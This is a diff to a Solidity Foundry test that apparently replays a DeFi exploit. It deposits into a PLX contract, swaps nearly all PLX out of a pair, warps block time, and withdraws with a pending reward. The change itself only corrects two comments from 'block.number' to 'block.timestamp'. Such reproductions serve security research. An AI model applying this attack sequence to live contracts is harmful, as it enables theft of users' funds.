@@ -110,11 +110,11 @@ contract ContractTest is DSTest{
         (bool success, ) = addressContract.call{value: 1 ether}(abi.encodeWithSignature("depositPLX()"));
         //revert();
         require(success);
-        // change block.number
+        // change block.timestamp
         cheats.warp(block.timestamp + 5 * 60 * 60); 
         amounts0 = PLX.balanceOf(address(Pair1)) - 1 * 1e18;
         Pair1.swap(amounts0, 0, address(this), new bytes(1));
-        // change block.number
+        // change block.timestamp
         cheats.warp(block.timestamp + 5 * 60 * 60 +1);
         uint amountreward = Pool.pendingReward(uint(9), addressContract);
         (bool success1, ) = addressContract.call(abi.encodeWithSignature("withdrawPLX()"));
